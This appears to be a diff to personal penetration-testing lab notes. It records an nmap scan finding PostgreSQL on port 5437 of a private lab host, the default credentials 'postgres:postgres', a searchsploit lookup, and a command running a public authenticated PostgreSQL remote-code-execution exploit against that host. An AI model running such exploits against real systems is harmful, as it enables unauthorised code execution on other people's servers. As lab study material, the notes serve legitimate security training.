@@ -253,7 +253,11 @@ sudo nmap -sC -sV -Pn -p- 192.168.207.47 -oN 207.47_allport
 5437/tcp open   postgresql   PostgreSQL DB 11.3 - 11.9
 
 # postgres:postgres
-psql -h 192.168.207.47 -U postgres -p 5437
+searchsploit postgres 
+PostgreSQL 9.3-11.7 - Remote Code Execution (RCE) (Authenticated)                                                         | multiple/remote/50847.py
+
+searchsploi
+python3 50847.py -i 192.168.207.47 -p 5437 -c id
 
 
 
